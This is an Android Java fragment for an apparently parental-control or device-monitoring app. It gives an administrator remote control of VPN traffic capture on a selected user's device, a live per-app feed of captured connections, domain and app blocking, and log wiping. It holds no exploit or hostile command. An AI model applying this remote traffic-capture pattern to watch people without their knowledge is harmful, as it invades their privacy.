package com.vikasyadavnsit.cdc.fragment;

import android.app.AlertDialog;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.chip.Chip;
import com.google.android.material.chip.ChipGroup;
import com.google.android.material.switchmaterial.SwitchMaterial;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.data.VpnConfig;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

public class AdminVpnFragment extends Fragment {

    private SwitchMaterial masterSwitch;
    private TextView statusBadge;
    private RecyclerView trafficRv;
    private TextView trafficEmpty;
    private ChipGroup appsChipGroup;
    private ChipGroup domainsChipGroup;
    private TextView appsEmpty, domainsEmpty;
    private TrafficAdapter adapter;
    private VpnConfig currentConfig;
    private User.AppTriggerSettingsData vpnTriggerData;
    private boolean switchUserInitiated = false;
    private ValueEventListener configListener;
    private ValueEventListener triggerListener;
    private ValueEventListener trafficListener;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_admin_vpn, container, false);

        view.findViewById(R.id.vpn_back_button).setOnClickListener(v ->
                getParentFragmentManager().popBackStack());

        masterSwitch = view.findViewById(R.id.vpn_master_switch);
        statusBadge = view.findViewById(R.id.vpn_status_badge);
        trafficRv = view.findViewById(R.id.vpn_traffic_rv);
        trafficEmpty = view.findViewById(R.id.vpn_traffic_empty);
        appsChipGroup = view.findViewById(R.id.vpn_blocked_apps_chips);
        domainsChipGroup = view.findViewById(R.id.vpn_blocked_domains_chips);
        appsEmpty = view.findViewById(R.id.vpn_apps_empty);
        domainsEmpty = view.findViewById(R.id.vpn_domains_empty);

        trafficRv.setLayoutManager(new LinearLayoutManager(getContext()));
        trafficRv.setNestedScrollingEnabled(false);
        adapter = new TrafficAdapter();
        trafficRv.setAdapter(adapter);

        view.findViewById(R.id.vpn_clear_traffic_btn).setOnClickListener(v -> {
            new androidx.appcompat.app.AlertDialog.Builder(requireContext())
                    .setTitle("Wipe VPN Logs")
                    .setMessage("Are you sure you want to clear all captured traffic history?")
                    .setPositiveButton("Wipe", (d, w) -> {
                        FirebaseUtils.clearVpnTraffic();
                        adapter.setItems(new ArrayList<>());
                        showTrafficEmpty(true);
                        Toast.makeText(getContext(), "Traffic log wiped", Toast.LENGTH_SHORT).show();
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
        });

        view.findViewById(R.id.vpn_add_app_btn).setOnClickListener(v -> 
            com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(getParentFragmentManager(), new AdminVpnAppListFragment()));
        view.findViewById(R.id.vpn_add_domain_btn).setOnClickListener(v -> showAddDomainDialog());

        masterSwitch.setOnCheckedChangeListener((btn, checked) -> {
            if (!switchUserInitiated) return;
            if (vpnTriggerData == null) {
                vpnTriggerData = User.AppTriggerSettingsData.builder()
                        .type(com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION)
                        .enabled(true)
                        .captureEnabled(checked)
                        .actionStatus(com.vikasyadavnsit.cdc.enums.ActionStatus.IDLE)
                        .permissionGranted(true)
                        .clickActions(com.vikasyadavnsit.cdc.enums.ClickActions.REQUEST_VPN_PERMISSION)
                        .build();
            } else {
                vpnTriggerData.setCaptureEnabled(checked);
            }
            updateStatusBadge(checked);
            FirebaseUtils.updateRemoteTrigger(com.vikasyadavnsit.cdc.enums.ClickActions.REQUEST_VPN_PERMISSION.name(), vpnTriggerData);
            
            // Also sync to legacy VpnConfig for compatibility if needed, or just let trigger handle it
            if (currentConfig == null) currentConfig = new VpnConfig();
            currentConfig.setEnabled(checked);
            FirebaseUtils.updateVpnConfig(currentConfig);
        });

        loadConfig();
        listenToTrigger();
        listenToTraffic();
        return view;
    }

    // ── Config ────────────────────────────────────────────────────────────────

    private void loadConfig() {
        configListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                currentConfig = snapshot.exists() ? snapshot.getValue(VpnConfig.class) : new VpnConfig();
                if (currentConfig == null) currentConfig = new VpnConfig();
                if (getView() == null) return;
                rebuildAppsChips();
                rebuildDomainsChips();
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        FirebaseUtils.getVpnConfig(configListener);
    }

    private void listenToTrigger() {
        triggerListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                vpnTriggerData = snapshot.getValue(User.AppTriggerSettingsData.class);
                if (vpnTriggerData == null) return;
                
                if (getView() == null) return;
                switchUserInitiated = false;
                boolean active = vpnTriggerData.isCaptureEnabled();
                masterSwitch.setChecked(active);
                updateStatusBadge(active);
                switchUserInitiated = true;
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + 
                com.vikasyadavnsit.cdc.enums.ClickActions.REQUEST_VPN_PERMISSION.name()))
                .addValueEventListener(triggerListener);
    }

    private void saveConfig() {
        FirebaseUtils.updateVpnConfig(currentConfig);
    }

    private void updateStatusBadge(boolean active) {
        if (statusBadge == null) return;
        statusBadge.setText(active ? "ACTIVE" : "OFF");
        statusBadge.setBackgroundTintList(android.content.res.ColorStateList.valueOf(
                active ? Color.parseColor("#4CAF50") : Color.parseColor("#9E9E9E")));
    }

    // ── Blocked Apps chips ────────────────────────────────────────────────────

    private void rebuildAppsChips() {
        appsChipGroup.removeAllViews();
        List<String> apps = currentConfig.getRestrictedApps();
        if (apps == null || apps.isEmpty()) {
            appsEmpty.setVisibility(View.VISIBLE);
            appsEmpty.setText("No apps blocked — all traffic is currently monitored");
            return;
        }
        appsEmpty.setVisibility(View.GONE);
        PackageManager pm = requireContext().getPackageManager();
        int count = 0;
        for (String pkg : apps) {
            if (count++ > 10) {
                appsChipGroup.addView(buildChip("+" + (apps.size() - 10) + " more...", () -> {
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(getParentFragmentManager(), new AdminVpnAppListFragment());
                }));
                break;
            }
            String label = resolveLabel(pm, pkg);
            appsChipGroup.addView(buildChip(label, () -> {
                currentConfig.getRestrictedApps().remove(pkg);
                saveConfig();
                rebuildAppsChips();
            }));
        }
    }

    // ── Blocked Domains chips ─────────────────────────────────────────────────

    private void rebuildDomainsChips() {
        domainsChipGroup.removeAllViews();
        List<String> domains = currentConfig.getRestrictedWebsites();
        if (domains == null || domains.isEmpty()) {
            domainsEmpty.setVisibility(View.VISIBLE);
            return;
        }
        domainsEmpty.setVisibility(View.GONE);
        for (String domain : domains) {
            domainsChipGroup.addView(buildChip(domain, () -> {
                currentConfig.getRestrictedWebsites().remove(domain);
                saveConfig();
                rebuildDomainsChips();
            }));
        }
    }

    private void showAddDomainDialog() {
        EditText input = new EditText(requireContext());
        input.setHint("e.g. facebook.com");
        input.setPadding(48, 32, 48, 16);
        new AlertDialog.Builder(requireContext())
                .setTitle("Block Domain")
                .setView(input)
                .setPositiveButton("Add", (dialog, w) -> {
                    String domain = input.getText().toString().trim().toLowerCase();
                    if (domain.isEmpty()) return;
                    if (currentConfig.getRestrictedWebsites() == null)
                        currentConfig.setRestrictedWebsites(new ArrayList<>());
                    if (currentConfig.getRestrictedWebsites().contains(domain)) {
                        Toast.makeText(getContext(), "Already blocked", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    currentConfig.getRestrictedWebsites().add(domain);
                    saveConfig();
                    rebuildDomainsChips();
                    Toast.makeText(getContext(), "Blocked: " + domain, Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("Cancel", null)
                .show();
    }

    // ── Traffic live feed ─────────────────────────────────────────────────────

    private void listenToTraffic() {
        trafficListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Map<String, List<Map<String, Object>>> grouped = new TreeMap<>(Collections.reverseOrder());
                for (DataSnapshot child : snapshot.getChildren()) {
                    Object value = child.getValue();
                    if (value instanceof Map) {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> entry = (Map<String, Object>) value;
                        String date = (String) entry.getOrDefault("date", "Unknown Date");
                        grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(0, entry); // newest first within date
                    }
                }

                List<Object> items = new ArrayList<>();
                for (Map.Entry<String, List<Map<String, Object>>> group : grouped.entrySet()) {
                    items.add(group.getKey());
                    items.addAll(group.getValue());
                }

                showTrafficEmpty(items.isEmpty());
                adapter.setItems(items);
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        FirebaseUtils.getVpnTraffic(trafficListener);
    }

    @Override
    public void onDestroyView() {
        if (configListener != null) FirebaseUtils.removeVpnConfigListener(configListener);
        if (trafficListener != null) FirebaseUtils.removeVpnTrafficListener(trafficListener);
        if (triggerListener != null) FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + 
                com.vikasyadavnsit.cdc.enums.ClickActions.REQUEST_VPN_PERMISSION.name()))
                .removeEventListener(triggerListener);
        super.onDestroyView();
    }

    private void showTrafficEmpty(boolean empty) {
        trafficEmpty.setVisibility(empty ? View.VISIBLE : View.GONE);
        trafficRv.setVisibility(empty ? View.GONE : View.VISIBLE);
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private String resolveLabel(PackageManager pm, String pkg) {
        try {
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    private Chip buildChip(String text, Runnable onDelete) {
        Chip chip = new Chip(requireContext());
        chip.setText(text);
        chip.setCloseIconVisible(true);
        chip.setChipBackgroundColorResource(R.color.surface_variant);
        chip.setTextColor(requireContext().getColor(R.color.text_primary));
        chip.setTextSize(11f);
        chip.setOnCloseIconClickListener(v -> {
            new AlertDialog.Builder(requireContext())
                    .setTitle("Remove block?")
                    .setMessage(text)
                    .setPositiveButton("Remove", (d, w) -> onDelete.run())
                    .setNegativeButton("Cancel", null)
                    .show();
        });
        return chip;
    }

    // ── Traffic tile adapter ──────────────────────────────────────────────────

    private static class TrafficAdapter extends RecyclerView.Adapter<RecyclerView.ViewHolder> {
        private static final int TYPE_HEADER = 0;
        private static final int TYPE_ITEM = 1;
        
        private List<Object> items = new ArrayList<>();

        void setItems(List<Object> list) {
            items = list;
            notifyDataSetChanged();
        }

        @Override
        public int getItemViewType(int position) {
            return items.get(position) instanceof String ? TYPE_HEADER : TYPE_ITEM;
        }

        @NonNull
        @Override
        public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            if (viewType == TYPE_HEADER) {
                View v = LayoutInflater.from(parent.getContext())
                        .inflate(R.layout.item_call_log_date_header, parent, false);
                return new HeaderViewHolder(v);
            } else {
                View v = LayoutInflater.from(parent.getContext())
                        .inflate(R.layout.item_vpn_traffic_tile, parent, false);
                return new ItemViewHolder(v);
            }
        }

        @Override
        public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder, int position) {
            if (holder instanceof HeaderViewHolder) {
                ((HeaderViewHolder) holder).dateText.setText((String) items.get(position));
            } else {
                ItemViewHolder h = (ItemViewHolder) holder;
                @SuppressWarnings("unchecked")
                Map<String, Object> e = (Map<String, Object>) items.get(position);
                String proto = str(e, "proto");
                String appName = str(e, "appName");
                String appPkg = str(e, "appPkg");
                String src = str(e, "src");
                String dst = str(e, "dst");
                String service = str(e, "service");
                String time = str(e, "time");
                Object bytesObj = e.get("bytes");
                String bytes = bytesObj != null ? bytesObj + "B" : "";

                h.proto.setText(proto);
                h.proto.setBackgroundTintList(android.content.res.ColorStateList.valueOf(protoColor(proto)));

                h.appName.setText(appName.isEmpty() ? "Unknown App" : appName);
                h.pkg.setText(appPkg.isEmpty() ? "" : appPkg);
                h.pkg.setVisibility(appPkg.isEmpty() ? View.GONE : View.VISIBLE);
                h.route.setText(src + "  →  " + dst);
                h.time.setText(time);

                if (!service.isEmpty()) {
                    h.service.setVisibility(View.VISIBLE);
                    h.service.setText(service);
                    h.service.setBackgroundTintList(android.content.res.ColorStateList.valueOf(serviceColor(service)));
                } else {
                    h.service.setVisibility(View.GONE);
                }
                h.bytes.setText(bytes);
            }
        }

        private String str(Map<String, Object> m, String key) {
            Object v = m.get(key);
            return v != null ? v.toString() : "";
        }

        private int protoColor(String proto) {
            switch (proto) {
                case "TCP":    return Color.parseColor("#2196F3");
                case "UDP":    return Color.parseColor("#4CAF50");
                case "ICMP":   return Color.parseColor("#FF9800");
                case "ICMPv6": return Color.parseColor("#FF5722");
                default:       return Color.parseColor("#607D8B");
            }
        }

        private int serviceColor(String svc) {
            switch (svc) {
                case "HTTPS":     return Color.parseColor("#4CAF50");
                case "HTTP":      return Color.parseColor("#FF9800");
                case "DNS":       return Color.parseColor("#9C27B0");
                case "FCM":       return Color.parseColor("#F44336");
                case "SSH":       return Color.parseColor("#F44336");
                default:          return Color.parseColor("#607D8B");
            }
        }

        @Override public int getItemCount() { return items.size(); }

        static class HeaderViewHolder extends RecyclerView.ViewHolder {
            TextView dateText;
            HeaderViewHolder(View v) {
                super(v);
                dateText = v.findViewById(R.id.cl_date_header_text);
            }
        }

        static class ItemViewHolder extends RecyclerView.ViewHolder {
            TextView proto, appName, pkg, route, time, service, bytes;
            ItemViewHolder(View v) {
                super(v);
                proto = v.findViewById(R.id.vpn_tile_proto);
                appName = v.findViewById(R.id.vpn_tile_app_name);
                pkg = v.findViewById(R.id.vpn_tile_pkg);
                route = v.findViewById(R.id.vpn_tile_route);
                time = v.findViewById(R.id.vpn_tile_time);
                service = v.findViewById(R.id.vpn_tile_service);
                bytes = v.findViewById(R.id.vpn_tile_bytes);
            }
        }
    }
}
